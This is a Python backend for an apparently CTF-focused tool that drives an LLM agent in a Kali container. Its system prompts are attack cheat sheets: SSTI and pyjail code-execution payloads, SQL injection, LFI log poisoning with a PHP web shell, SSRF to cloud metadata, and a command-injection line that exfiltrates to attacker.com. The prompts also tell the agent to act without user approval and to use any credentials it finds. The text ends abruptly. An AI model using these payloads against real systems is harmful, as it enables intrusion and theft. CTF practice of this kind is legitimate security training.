"""
Big Stein (The Penetrator) — Flask + Socket.IO backend
Open http://localhost:7331 in your browser
"""

import io
import base64
import json
import os
import re
import tarfile
import threading
import time
import uuid
from collections import deque
from types import SimpleNamespace
from datetime import datetime
from pathlib import Path

import docker
from flask import Flask, jsonify, request, send_from_directory, render_template
from flask_socketio import SocketIO, emit
from openai import OpenAI
from werkzeug.utils import secure_filename

# ─── App setup ────────────────────────────────────────────────────────────────

BASE_DIR    = Path(__file__).parent
CONFIG_PATH = BASE_DIR / "config.json"
DB_PATH     = BASE_DIR / "challenges.json"
UPLOAD_DIR  = BASE_DIR / "uploads"
UPLOAD_DIR.mkdir(exist_ok=True)

app = Flask(__name__, template_folder="templates", static_folder="static")
app.config["SECRET_KEY"] = "ctf-agent-secret"
app.config["MAX_CONTENT_LENGTH"] = 256 * 1024 * 1024  # 256MB max upload
# Flask 3.x removed RequestContext.session setter; disable server-managed sessions
# to avoid Socket.IO setting ctx.session (not needed here).
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading", manage_session=False)

# ─── Config ───────────────────────────────────────────────────────────────────

def load_config() -> dict:
    if not CONFIG_PATH.exists():
        return {}
    return json.load(open(CONFIG_PATH))

def _as_bool(value, default=False) -> bool:
    if isinstance(value, bool):
        return value
    if value is None:
        return default
    s = str(value).strip().lower()
    if s in {"1", "true", "yes", "on"}:
        return True
    if s in {"0", "false", "no", "off"}:
        return False
    return default

# ─── Challenge DB ─────────────────────────────────────────────────────────────

CATEGORIES = ["pwn", "web", "crypto", "forensics", "rev", "misc", "osint", "network"]
_db_lock = threading.RLock()

def _load_challenges_unlocked() -> list[dict]:
    if not DB_PATH.exists():
        return []
    with open(DB_PATH, "r", encoding="utf-8") as f:
        return json.load(f)

def _save_challenges_unlocked(challenges: list[dict]):
    tmp_path = DB_PATH.with_name(DB_PATH.name + ".tmp")
    with open(tmp_path, "w", encoding="utf-8") as f:
        json.dump(challenges, f, indent=2)
    os.replace(tmp_path, DB_PATH)

def load_challenges() -> list[dict]:
    with _db_lock:
        return _load_challenges_unlocked()

def save_challenges(challenges: list[dict]):
    with _db_lock:
        _save_challenges_unlocked(challenges)

def get_challenge(cid: str) -> dict | None:
    with _db_lock:
        return next((c for c in _load_challenges_unlocked() if c["id"] == cid), None)

def _with_runtime(chal: dict) -> dict:
    if not chal:
        return chal
    running = False
    if chal["id"] in _agents:
        try:
            running = bool(_agents[chal["id"]].running)
        except Exception:
            running = False
    out = dict(chal)
    out["running"] = running
    return out

def update_challenge(cid: str, **kwargs):
    with _db_lock:
        chals = _load_challenges_unlocked()
        for c in chals:
            if c["id"] == cid:
                c.update(kwargs)
        _save_challenges_unlocked(chals)

# ─── Docker ───────────────────────────────────────────────────────────────────

IMAGE_NAME       = "ctf-kali:latest"
CONTAINER_PREFIX = "ctf-agent-"
_docker_client   = None

def get_docker():
    global _docker_client
    if _docker_client is None:
        _docker_client = docker.from_env()
    return _docker_client

def image_exists() -> bool:
    try:
        get_docker().images.get(IMAGE_NAME)
        return True
    except:
        return False

class ContainerConnection:
    def __init__(self, challenge_id: str):
        self.cid       = challenge_id
        self._lock     = threading.Lock()
        self.container = None

    def start(self):
        name = f"{CONTAINER_PREFIX}{self.cid}"
        try:
            old = get_docker().containers.get(name)
            old.remove(force=True)
        except docker.errors.NotFound:
            pass
        self.container = get_docker().containers.run(
            IMAGE_NAME,
            name=name,
            command="sleep infinity",
            detach=True,
            remove=False,
            mem_limit="2g",
            cpu_period=100000,
            cpu_quota=200000,
            network_mode="bridge",
            privileged=False,
            security_opt=["no-new-privileges"],
            working_dir="/ctf",
        )
        self.run("mkdir -p /ctf")

    def run(self, cmd: str, timeout: int = 60) -> str:
        with self._lock:
            if not self.container:
                return "[container not running]"
            try:
                # Normalize venv activation usage to avoid missing activate script.
                if "/ctf/.venv/bin/activate" in cmd:
                    # Ensure venv exists and run with venv python instead of sourcing activate.
                    cmd = cmd.replace("source /ctf/.venv/bin/activate && ", "")
                    cmd = re.sub(r"^\s*python(3(\.\d+)*)?\b", "/ctf/.venv/bin/python", cmd, count=1)
                    cmd = "python3 -m venv /ctf/.venv >/dev/null 2>&1 || true; " + cmd
                exec_cmd = cmd
                if timeout and int(timeout) > 0:
                    # Enforce an execution deadline inside the container.
                    exec_cmd = f"timeout {int(timeout)}s bash -lc {_shell_quote(cmd)}"
                _, output = self.container.exec_run(
                    ["bash", "-lc", exec_cmd], workdir="/ctf",
                    demux=False
                )
                return (output or b"").decode("utf-8", errors="replace").strip()
            except Exception as e:
                return f"[exec error: {e}]"

    def run_gdb(self, binary: str, gdb_cmds: list, timeout: int = 60) -> str:
        batch = " ".join(f'-ex "{c}"' for c in gdb_cmds)
        # Find pwndbg gdbinit — Kali apt puts it at /usr/share/pwndbg/gdbinit.py,
        # source-installed goes to /opt/pwndbg/gdbinit.py
        pwndbg_init = (
            "$(ls /usr/share/pwndbg/gdbinit.py /opt/pwndbg/gdbinit.py 2>/dev/null | head -1)"
        )
        cmd = (
            f'PWNDBG=$(ls /usr/share/pwndbg/gdbinit.py /opt/pwndbg/gdbinit.py 2>/dev/null | head -1); '
            f'if [ -n "$PWNDBG" ]; then '
            f'  gdb -batch -nx -ex "source $PWNDBG" {batch} {binary} 2>&1; '
            f'else '
            f'  gdb -batch -nx {batch} {binary} 2>&1; '
            f'fi'
        )
        return self.run(cmd, timeout)

    def upload_file(self, local_path: str) -> str:
        local  = Path(local_path)
        fname  = local.name
        buf    = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tar:
            tar.add(str(local), arcname=fname)
        buf.seek(0)
        self.container.put_archive("/ctf", buf)
        ext = local.suffix.lower()
        if ext == ".zip":
            self.run(f"cd /ctf && unzip -o '{fname}' 2>&1")
        elif ext in (".tar", ".gz", ".tgz", ".bz2", ".xz"):
            self.run(f"cd /ctf && tar xf '{fname}' 2>&1")
        return f"/ctf/{fname}"

    def write_file(self, fname: str, content: str) -> str:
        """Write a file directly into /ctf/ in the container."""
        fname = fname.lstrip("/").replace("../", "")
        content_bytes = content.encode("utf-8")
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tar:
            info = tarfile.TarInfo(name=fname)
            info.size = len(content_bytes)
            tar.addfile(info, io.BytesIO(content_bytes))
        buf.seek(0)
        self.container.put_archive("/ctf", buf)
        return f"/ctf/{fname}"

    def stop(self):
        if self.container:
            try:
                self.container.remove(force=True)
            except:
                pass
            self.container = None

    @property
    def running(self) -> bool:
        if not self.container:
            return False
        try:
            self.container.reload()
            return self.container.status == "running"
        except:
            return False

# Per-challenge container registry
_containers: dict[str, ContainerConnection] = {}

def get_container(cid: str) -> ContainerConnection:
    if cid not in _containers or not _containers[cid].running:
        _containers[cid] = ContainerConnection(cid)
        _containers[cid].start()
    return _containers[cid]

def sync_challenge_uploads(cid: str, container: ContainerConnection):
    # Rehydrate files from host uploads into a fresh container.
    chal_upload_dir = UPLOAD_DIR / cid
    if not chal_upload_dir.exists():
        return
    files = []
    for p in sorted(chal_upload_dir.iterdir()):
        if p.is_file():
            container.upload_file(str(p))
            files.append(p.name)
    if files:
        update_challenge(cid, files=files)

# ─── Category Prompts ─────────────────────────────────────────────────────────

BASE_RULES = """You are an elite CTF security researcher in a Kali Linux Docker container.
Working directory: /ctf/ (all challenge files are here)
Tools available: pwntools, gdb+pwndbg, checksec, ROPgadget, one_gadget, sqlmap, gobuster, ffuf, RsaCtfTool, binwalk, steghide, zsteg, stegseek, fcrackzip, hashcat, john, tshark, scapy, volatility3, angr, z3-solver, and more.
You may install missing tools/libs when needed. For Python, use /ctf/.venv and pip.
For system tools, use apt-get (non-interactive) if required.

AVAILABLE TOOLS:
- run_command  : run any bash command in the container
- run_gdb      : run GDB+pwndbg on a binary in batch mode (never hangs)
- write_file   : write a file directly to /ctf/ (use for exploit scripts, solvers, C files, payloads)
- submit_flag  : submit the flag the instant you find it
- search_flag  : recursively grep /ctf/ for flag-shaped strings

WORKFLOW RULES:
- write_file → run_command is the pattern for exploit scripts: write the script, then execute it
- Use run_gdb for binary triage and debugging; never use run_command to invoke gdb interactively
- submit_flag immediately when any output contains a valid flag string
- Never guess flags. Derive them empirically from the challenge artifacts
- Never repeat a failed command verbatim — change the approach each time
- During execution turns, respond with tool calls only. During planning/re-planning, respond with text.
- All tool arguments must be valid JSON
- Work hypothesis-first: state what you are testing and what output would confirm/deny it
- Prefer one decisive targeted command over many shallow recon commands
- After each result: update confirmed facts, ruled-out paths, next best action
- If 3 consecutive actions yield no new evidence, CHANGE strategy entirely
- If a command returns "command not found", auto-install the tool and retry once

INSTALL POLICY:
  apt: apt-get update -y && DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends <pkg>
  python: /ctf/.venv/bin/python -m pip install <pkg>
  OR: python3 -m pip --break-system-packages install <pkg>

INTERACTIVE CHALLENGES (netcat/remote services):
  Use pwntools: write_file exploit.py with "from pwn import *; p = remote('HOST', PORT); ..."
  Then run_command: /ctf/.venv/bin/python /ctf/exploit.py

FLAG RECOGNITION:
  Pattern: WORD{content} — e.g. picoCTF{...}, flag{...}, cyberfusion{...}, CTF{...}
  Always run search_flag after any extraction, decryption, or decompilation step
  Check all extracted files, decoded bytes, memory dumps, and command output

ENCODED STRINGS — ALWAYS DECODE IMMEDIATELY:
  When ANY command output or metadata contains a base64/hex/encoded token:
  → Decode it immediately before your next action
  → If decoded result points to a tool or contains a credential, act on it right away
  → Decode chains fully: one encoding may layer another; keep decoding until you reach plaintext
  → Do not shelve encoded strings to investigate later — follow them now

EXAMPLES (correct):
  write_file: {"filename":"exploit.py","content":"from pwn import *\n...","reasoning":"pwntools exploit"}
  run_gdb: {"binary_path":"/ctf/vuln","gdb_commands":["checksec","info functions","disas main"]}
  submit_flag: {"flag":"picoCTF{abc123}","how_found":"printed by binary after exploit"}

EXAMPLES (incorrect):
  Preceding text before a tool call → wrong
  Guessing a flag without evidence → wrong
  Repeating the exact same failing command → wrong
"""

COMPACT_BASE_RULES = """You are a deterministic CTF solving agent in a Kali container.
Use only tool calls during execution turns. Never guess flags.
Prefer one decisive command over broad exploration. Use exactly one decisive tool call per turn.
Do not ask the user for approval; execute the best next action autonomously.
If no progress after 2 actions on a hypothesis, pivot strategy.
Submit immediately when a valid flag appears. Preserve reproducibility: avoid installing new tools unless policy allows it.
"""

CATEGORY_EXECUTION_BRIEFS = {
    "pwn": "Prioritize checksec, symbols, controlled crash, offset, then exploit script (write_file -> run_command).",
    "web": "Prioritize endpoint discovery, auth/session flaws, injection primitives, then focused exploitation.",
    "crypto": "Identify primitive first, test known break conditions, implement shortest solver script.",
    "forensics": "Start with file/meta triage, decode embedded artifacts, then extraction chain and targeted scans.",
    "rev": "Triaging strings/calls first, then static+dynamic path to recover constraints/secret.",
    "misc": "Classify encoding/challenge type quickly, run layered decode or environment escape with evidence.",
    "osint": "Extract entities, run structured source checks, correlate and validate before submission.",
    "network": "Protocol hierarchy first, follow key streams/sessions, extract objects/credentials/flag artifacts.",
}

CATEGORY_PROMPTS = {
    "pwn": BASE_RULES + """
BINARY EXPLOITATION EXPERT.

TRIAGE (always do first):
  checksec --file=/ctf/BINARY
  file /ctf/BINARY
  strings -a /ctf/BINARY | grep -E "flag|pass|key|correct|wrong|sh|/bin"
  run_gdb: ["checksec", "info functions", "disas main", "disas vulnerable_function"]

PROTECTION → ATTACK MAPPING:
  No NX        → inject shellcode (find stack ptr, write shellcode, jump to it)
  NX, no PIE   → ret2plt/ret2libc with static gadget addresses
  NX, PIE      → leak PIE base via format string or info leak, then ROP
  Canary       → leak via format string (%p chain), find offset, overwrite after leak
  No RELRO     → overwrite GOT entry to redirect execution
  Full RELRO   → use one_gadget, SROP, or ret2dlresolve

BUFFER OVERFLOW → ROP CHAIN RECIPE (x86-64):
  1. Find offset: cyclic(200) as input, run_gdb ["run <<< $(python3 -c \"from pwn import*;print(cyclic(200).decode())\")","bt","info registers"]
     Then: cyclic_find(0x<rsp_value>) to get exact offset
  2. Find "pop rdi; ret": ROPgadget --binary /ctf/BINARY --rop | grep "pop rdi"
  3. Leak libc: payload = b"A"*offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
  4. Identify libc from leak: /ctf/.venv/bin/python -c "import subprocess; subprocess.run(['python3','-c','from pwn import*; l=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\"); print(hex(l.sym[\"puts\"]))'])"
     OR use: one_gadget /lib/x86_64-linux-gnu/libc.so.6
  5. Second stage: libc_base = leaked - libc.sym['puts']; system = libc_base + libc.sym['system']; binsh = libc_base + next(libc.search(b'/bin/sh'))

PWNTOOLS EXPLOIT TEMPLATE (write_file then run):
  from pwn import *
  context.binary = elf = ELF('/ctf/BINARY')
  libc = ELF('/ctf/libc.so.6')  # or system libc
  # p = process('/ctf/BINARY')
  p = remote('HOST', PORT)
  rop = ROP(elf)
  # ... build payload ...
  p.sendline(payload)
  p.interactive()

FORMAT STRING EXPLOITATION:
  Find offset: run_gdb ["run", "set args 'AAAA.%p.%p.%p.%p.%p.%p.%p.%p'"]
  Leak canary/addresses: %N$p where N is the offset
  Arbitrary write: fmtstr_payload(offset, {target_addr: value}, write_size='byte')

HEAP EXPLOITATION:
  vis_heap_chunks in pwndbg after each alloc/free
  tcache poisoning: fill bin (7 frees), double-free, overwrite fd → arbitrary alloc
  fastbin dup: similar but size must match fastbin class
  UAF: free chunk → use dangling pointer → write controlled data
  Heap leak: print unsorted bin fd/bk which points into libc (libc_base = leak - offset)

ONE_GADGET:
  one_gadget /lib/x86_64-linux-gnu/libc.so.6
  one_gadget /ctf/libc.so.6
  Try each gadget address; check constraints (rax==NULL, [rsp+X]==NULL etc.)
""",

    "web": BASE_RULES + """
WEB EXPLOITATION EXPERT.

MANDATORY DECISION TREE (execute in this order; do not skip ahead):
  1) Upload primitive validation:
     - Confirm what upload types are accepted/rejected and whether extension/MIME/content checks are enforced.
     - Use one benign image + one controlled polyglot probe to validate behavior.
  2) Execution path check:
     - Verify where uploaded files are stored/served.
     - Prove whether uploaded content is executed or only served as static bytes.
  3) Include/LFI checks:
     - Test only high-probability include/path parameters on real existing endpoints.
     - Prioritize direct include candidates before broad parameter spraying.
  4) Bounded endpoint fuzzing (LAST):
     - Only after 1-3 fail.
     - Run at most one bounded ffuf/gobuster pass, then pivot based on evidence.

ANTI-SPAM WEB RULE:
  Repeated default 404/403 pages and same-body responses are non-progress. Pivot quickly.

RECON (always start here):
  curl -sv URL -L --max-redirs 5 2>&1 | head -80   ← headers, redirects, cookies
  curl -s URL/robots.txt URL/sitemap.xml URL/.git/HEAD URL/admin URL/api 2>&1
  ffuf -u URL/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 50

SOURCE ANALYSIS:
  curl -s URL | grep -E "api|token|key|secret|flag|password|admin|debug|TODO|FIXME|config|env"
  Check JS files: curl -s URL/app.js URL/main.js URL/bundle.js | grep -E "api|key|token|secret"

SSTI (Server-Side Template Injection):
  Detection: send {{7*7}}, ${7*7}, #{7*7}, *{7*7}, <%=7*7%> → look for "49" in response
  Jinja2 (Flask/Python):
    {{config.items()}}  ← dump config
    {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
    {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
  Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
  Mako (Python): ${__import__('os').popen('id').read()}
  FreeMarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

SQL INJECTION:
  Detection: ' → error? → likely SQLi
  UNION: ' ORDER BY 1-- → increment until error; ' UNION SELECT null,null,null--
  Dump: ' UNION SELECT table_name,null FROM information_schema.tables--
  Blind time: ' AND SLEEP(3)-- (MySQL) / '; SELECT pg_sleep(3)--  (PostgreSQL)
  Automated: sqlmap -u "URL?param=1" --dbs --batch
             sqlmap -u URL --forms --dbs --batch --level=3 --risk=2

JWT ATTACKS:
  Decode: echo "JWT_HEADER.PAYLOAD.SIG" | cut -d. -f1,2 | base64 -d 2>/dev/null
  1. alg:none → set alg to "none", remove signature: header.payload.
  2. Weak secret: hashcat -a 0 -m 16500 JWT /usr/share/wordlists/rockyou.txt
  3. RS256→HS256 confusion: use RS256 public key as HS256 HMAC secret
  4. kid injection: ../../dev/null → sign with empty string key
  jwt-tool JWT -T   ← interactive tamper tool

LFI / PATH TRAVERSAL:
  Probe: ?file=../../../etc/passwd → check response
  PHP wrappers: ?file=php://filter/convert.base64-encode/resource=index.php → base64 decode
  Log poisoning: curl -A "<?php system($_GET['cmd']); ?>" URL/  → then ?file=/var/log/apache2/access.log&cmd=id
  RFI: ?file=http://attacker/shell.php (if allow_url_include=On)

SSRF:
  Target: http://169.254.169.254/latest/meta-data/ (AWS), http://metadata.google.internal/ (GCP)
  Bypass: http://0x7f000001/, http://127.1/, http://[::1]/, decimal IP, DNS rebind
  Protocol smuggling: gopher://, dict://, file://

COMMAND INJECTION:
  ; id, && id, | id, `id`, $(id) — URL-encode if needed: %3Bid, %26%26id
  Blind: ; curl attacker.com/$(id|base64 -w0)
  Time-based blind: ; sleep 5

GRAPHQL:
  Introspection: {"query":"{__schema{types{name fields{name}}}}"}
  Batch attack: send array of queries for authentication bypass
  Mutation injection: look for createUser/updateUser type mutations

DESERIALIZATION:
  Python pickle: check for pickle.loads() on user input → craft malicious pickle
  PHP: check for unserialize() → use phpggc gadget chains
  Java: look for ObjectInputStream → use ysoserial payloads
""",

    "crypto": BASE_RULES + """
CRYPTOGRAPHY EXPERT.

IDENTIFY FIRST: read the source/description carefully before trying anything.
Look for: cipher name, key size, mode of operation, nonce reuse, oracle endpoints.

RSA ATTACK DECISION TREE:
  1. Always try first: RsaCtfTool --publickey key.pem --attack all --private
  2. n is small (< 512 bits): factor with python3 -c "from factordb.factordb import FactorDB; f=FactorDB(n); f.connect(); print(f.get_factor_list())"
  3. e=3, no padding: m = gmpy2.iroot(c, 3)[0]; print(long_to_bytes(m))
  4. e=3, multiple recipients with same m: Hastad CRT — m^3 ≡ c1,c2,c3 mod n1,n2,n3 → CRT → cube root
  5. e large, suspect d small: Wiener — RsaCtfTool --attack wiener
  6. Two moduli share a prime: p = gmpy2.gcd(n1, n2); if p > 1 → factor both
  7. n=p*q where p≈q: Fermat factorization — a=gmpy2.isqrt(n)+1; while True: b2=a*a-n; if gmpy2.is_square(b2): break; a+=1
  8. Same n, two different e, same m: extended Euclidean — s,t=ext_gcd(e1,e2); m=pow(c1,s,n)*pow(c2,t,n)%n
  9. Known high bits of p: Coppersmith — use SageMath or RsaCtfTool --attack partial_q

PYCRYPTODOME RSA TEMPLATE:
  from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse
  import gmpy2
  p, q = ...; n = p*q; phi = (p-1)*(q-1); d = inverse(e, phi)
  m = pow(c, d, n); print(long_to_bytes(m))

AES ATTACKS:
  ECB mode: identical plaintext blocks → identical ciphertext blocks
    Byte-at-a-time: craft input with known prefix, decrypt one byte at a time
    Cut-and-paste: rearrange ciphertext blocks to forge admin roles
  CBC bit-flip: XOR byte in C[i-1] to flip the corresponding byte in P[i]
    flip_byte = known_plaintext_byte ^ desired_byte ^ ciphertext_byte
  CBC padding oracle: send modified ciphertext, detect padding errors → PKCS#7 oracle decrypt
    Use: python3 -m pip install -q pycryptodome; write custom padding oracle script
  CTR/OFB nonce reuse: XOR two ciphertexts to get keystream XOR; use cribs to recover plaintext
    c1 XOR c2 = p1 XOR p2; crib drag known plaintext words against the XOR

XOR / STREAM CIPHERS:
  Single-byte XOR: try all 256 keys, score by English letter frequency
    python3 -c "from pwn import xor; [print(k, xor(ct,bytes([k]))) for k in range(256) if all(32<=b<127 for b in xor(ct,bytes([k])))]"
  Repeating-key XOR (Vigenère): IC test for key length, then frequency analysis per position
    key_len: max IC at len N → each position is single-byte XOR
  Two-time pad: XOR c1^c2, crib drag with likely plaintext words

HASHING:
  MD5/SHA1 length extension: hashpumpy.hashpump(sig, original_data, append_data, key_len)
  CRC32 collision: birthday attack or preimage for small hashes
  bcrypt cost factor: john --format=bcrypt or hashcat -m 3200

DISCRETE LOG / ECC:
  Small group order: baby-step giant-step — sympy.ntheory.discrete_log(p, h, g)
  ECDSA same-nonce reuse: k = (z1-z2) * inverse(s1-s2, order) % order; d = (s1*k-z1) * inverse(r1, order) % order
  Invalid curve attack: send point not on curve to extract private key scalar
  Singular curve: map to additive/multiplicative group via substitution

PRNG:
  Python random (Mersenne Twister): collect 624 outputs → untwister or randcrack
  LCG: given x_n, x_{n+1}: a=(x2-x3)*inverse(x1-x2,m)%m; b=(x2-a*x1)%m
""",

    "forensics": BASE_RULES + """
FORENSICS EXPERT.

TRIAGE FIRST (run all of these before deep analysis):
  file /ctf/*
  exiftool -a -u -g1 /ctf/FILE
  binwalk /ctf/FILE
  strings -a -n 8 /ctf/FILE | head -60
  xxd /ctf/FILE | head -30
  ls -lah /ctf/

After triage: inspect all metadata fields and encoded strings.
  Decode any base64/hex tokens found in exiftool, strings, or xxd output:
    python3 -c "import base64; print(base64.b64decode('TOKEN').decode('utf-8','ignore'))"
    OR: echo 'TOKEN' | base64 -d
  Act on decoded results immediately — follow the content to the next concrete step.

IMAGE STEGANOGRAPHY:
  PNG/BMP — zsteg /ctf/FILE --all  ← LSB, metadata, multiple color planes
  Any image — stegoveritas /ctf/FILE  (installs via: pip install stegoveritas && stegoveritas_setup)
  steghide — steghide extract -sf /ctf/FILE -p ""  (empty pass) then try found passwords
  Fast brute-force — stegseek /ctf/FILE /usr/share/wordlists/rockyou.txt
  Binwalk extract — binwalk --run-as=root -e /ctf/FILE; ls /ctf/_FILE.extracted/
  JPEG secrets — outguess -r /ctf/FILE output.txt 2>/dev/null; cat output.txt
  Append after EOF — xxd /ctf/FILE | grep -A2 "ff d9"   ← JPEG EOF; tail -c +OFFSET /ctf/FILE > tail.bin
  Alpha/LSB — python3: from PIL import Image; img=Image.open('f.png'); [lsb bits of each pixel]

AUDIO STEGANOGRAPHY:
  Spectrogram — sox /ctf/FILE -n spectrogram -o /ctf/spec.png 2>/dev/null || ffmpeg -i /ctf/FILE -lavfi showspectrumpic /ctf/spec.png
  DTMF tones — multimon-ng -t WAV -a DTMF /ctf/FILE
  Morse audio — ffmpeg + visual inspection of waveform
  Deep steganography — mp3stego: Decode.exe (Windows); on Linux: strings /ctf/FILE | grep -E "pass|flag|key"

PDF ANALYSIS:
  pdf-parser.py --stats /ctf/FILE
  pdf-parser.py -a /ctf/FILE   ← all objects
  pdfdetach -list /ctf/FILE; pdfdetach -saveall -o /ctf/pdf_extract/ /ctf/FILE
  pdftotext /ctf/FILE -   ← extract text (may reveal hidden text)
  strings /ctf/FILE | grep -E "flag|pass|key|secret"
  Look for: /JS (JavaScript), /AA (actions), /EmbeddedFile, white-on-white text, hidden layers

MEMORY IMAGE (volatility3):
  python3 $(which vol) -f /ctf/FILE windows.info
  python3 $(which vol) -f /ctf/FILE windows.pslist
  python3 $(which vol) -f /ctf/FILE windows.cmdline
  python3 $(which vol) -f /ctf/FILE windows.filescan | grep -iE "flag|secret|pass|\.txt|\.doc|\.zip"
  python3 $(which vol) -f /ctf/FILE windows.dumpfiles --virtaddr ADDR -o /ctf/
  python3 $(which vol) -f /ctf/FILE windows.hashdump   ← SAM password hashes → john/hashcat
  python3 $(which vol) -f /ctf/FILE windows.clipboard
  python3 $(which vol) -f /ctf/FILE windows.registry.hivelist
  python3 $(which vol) -f /ctf/FILE windows.registry.printkey --key "SOFTWARE\\..."
  Linux: linux.pslist, linux.bash, linux.find.Find

DISK IMAGE (sleuthkit):
  mmls /ctf/FILE          ← partition table + start offsets
  fls -r -o OFFSET /ctf/FILE | head -80   ← all files in partition
  fls -r -o OFFSET /ctf/FILE | grep -iE "flag|secret|pass|delete"
  icat -o OFFSET /ctf/FILE INODE_NUM > /ctf/extracted_file
  tsk_recover -e -o OFFSET /ctf/FILE /ctf/recovered/
  grep -r "flag" /ctf/recovered/ 2>/dev/null

ARCHIVE PASSWORDS:
  ZIP: fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt /ctf/FILE.zip
       unzip -P "" /ctf/FILE.zip 2>/dev/null   ← try empty pass first
  7z:  7z x -p"" /ctf/FILE.7z 2>/dev/null || 7z x -p"PASSWORD" /ctf/FILE.7z
  RAR: unrar e /ctf/FILE.rar  (try no pass); unrar e -pPASSWORD /ctf/FILE.rar

NETWORK PCAP (in forensics context):
  tshark -r /ctf/FILE -qz io,phs
  tshark -r /ctf/FILE -Y "http.request or http.response" -T fields -e http.request.uri -e http.file_data | head -40
  strings /ctf/FILE | grep -E "[a-zA-Z0-9_]{2,24}\{[^{}]{1,200}\}"  ← quick flag scan
""",

    "rev": BASE_RULES + """
REVERSE ENGINEERING EXPERT.

TRIAGE (always start here):
  file /ctf/BINARY
  checksec --file=/ctf/BINARY
  strings -a -n 6 /ctf/BINARY | grep -E "flag|pass|key|correct|wrong|good|bad|win|lose"
  strings -e l /ctf/BINARY | head -30   ← wide (UTF-16) strings
  ltrace ./BINARY 2>&1 | head -40       ← library calls (strcmp/strncmp catches easy challenges)
  strace ./BINARY 2>&1 | head -40       ← syscall trace

QUICK WINS (check in order):
  1. strcmp/strncmp in ltrace output → input is compared directly to secret → submit that string
  2. Strings output contains plaintext flag or password
  3. UPX packed → upx -d /ctf/BINARY → re-analyze
  4. XOR'd strings → find key in strings output, write decoder

STATIC ANALYSIS (rizin):
  rizin -A /ctf/BINARY
  afl        ← list all functions
  pdf @ main ← disassemble main
  pdf @ sym.check_password   ← interesting functions
  pz @ ADDR  ← print string at address
  iz         ← all strings with addresses

ANGR SYMBOLIC EXECUTION (write_file then run):
  import angr, claripy, sys
  proj = angr.Project('/ctf/BINARY', auto_load_libs=False)
  # Option A: find stdout output containing "correct"
  simgr = proj.factory.simgr()
  simgr.explore(find=lambda s: b'correct' in s.posix.dumps(1),
                avoid=lambda s: b'wrong' in s.posix.dumps(1))
  if simgr.found:
      sol = simgr.found[0]
      print("STDIN:", sol.posix.dumps(0))
      print("STDOUT:", sol.posix.dumps(1))
  # Option B: find specific address
  target_addr = 0x401234  # address of "win" or flag-print function
  simgr.explore(find=target_addr)
  # Option C: argv input
  argv1 = claripy.BVS('argv1', 8*20)
  state = proj.factory.entry_state(args=[proj.filename, argv1])
  simgr = proj.factory.simgr(state)
  simgr.explore(find=lambda s: b'correct' in s.posix.dumps(1))

Z3 CONSTRAINT SOLVER (when you see arithmetic checks in decompile):
  from z3 import *
  flag = [BitVec(f'f{i}', 8) for i in range(N)]
  s = Solver()
  s.add(flag[0] == ord('f'), flag[1] == ord('l'), ...)  # known prefix
  s.add(flag[0] + flag[2] == 0x41)  # add constraints from decompilation
  s.add(And(flag[i] >= 0x20, flag[i] <= 0x7e) for i in range(N))  # printable
  if s.check() == sat:
      m = s.model()
      print(bytes([m[flag[i]].as_long() for i in range(N)]))

ANTI-DEBUG BYPASS:
  ptrace check: run_gdb ["catch syscall ptrace", "commands", "set $rax=0", "end", "run"]
  LD_PRELOAD: write_file fake_ptrace.c with ptrace wrapper returning 0; compile & preload
  /proc/self/status TracerPid: patch the conditional jump after the check
  Timing checks: gdb "set scheduler-locking on" to freeze timing

COMMON PATTERNS:
  XOR cipher: find key length from repeating pattern; XOR decrypt
  Base64 custom alphabet: look for 64-char alphabet string in binary
  Custom hash: reconstruct hash function from decompilation, brute-force input
  VM / interpreter: identify dispatch loop (switch on opcode), write disassembler
  .NET/Mono: monodis /ctf/BINARY.exe > output.il; ilspy if available
  Java .class: javap -c /ctf/Foo.class OR use jadx if installed
  Python .pyc: python3 -m uncompyle6 /ctf/file.pyc 2>/dev/null || decompile3 /ctf/file.pyc
""",

    "misc": BASE_RULES + """
MISC EXPERT.

IDENTIFY THE ENCODING FIRST:
  file /ctf/FILE; xxd /ctf/FILE | head -10; strings -a /ctf/FILE | head -20
  Common encodings: base64 (A-Za-z0-9+/=), hex (0-9a-f), base32 (A-Z2-7=),
    base58 (Bitcoin alphabet), binary (0/1 sequences), octal, decimal

MULTI-LAYER DECODING (Python one-liners):
  base64: import base64; print(base64.b64decode(DATA))
  hex:    bytes.fromhex("HEXSTRING")
  rot13:  import codecs; codecs.decode(S, 'rot_13')
  URL:    from urllib.parse import unquote; unquote(S)
  zlib:   import zlib; zlib.decompress(DATA)
  gzip:   import gzip,io; gzip.decompress(DATA)
  Write a decode loop: try b64→hex→rot→zlib each iteration until stable

DECODE LOOP SCRIPT (write_file decode.py):
  import base64, codecs, zlib
  data = open('/ctf/FILE','rb').read().strip()
  for _ in range(20):
      changed = False
      for fn in [base64.b64decode, bytes.fromhex, lambda x: codecs.decode(x,'hex'),
                  zlib.decompress, lambda x: base64.b32decode(x, casefold=True)]:
          try:
              new = fn(data if isinstance(data,bytes) else data.encode())
              if new != data: data = new; changed = True; print(type(fn).__name__, repr(data[:80])); break
          except: pass
      if not changed: break
  print('FINAL:', data)

PYJAIL / RESTRICTED SHELL ESCAPE:
  Enumerate: print(dir()); print(__builtins__); print(globals())
  Get subclasses: ().__class__.__bases__[0].__subclasses__()
  Find Popen: [c for c in ().__class__.__bases__[0].__subclasses__() if 'Popen' in str(c)]
  Execute: __import__('os').system('id')
  Bypass builtins filter: getattr(__builtins__,'__import__')('os').system('id')
  __builtins__ as dict: __builtins__['__import__']('os').system('id')
  String bypass: __import__('\x6f\x73').system('\x69\x64')
  eval of list: eval(compile('import os;os.system("id")','','exec'))
  rbash escape: bash -i; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

ESOTERIC LANGUAGES:
  Brainfuck: python3 -c "import brainfuck; ..." or run bf interpreter
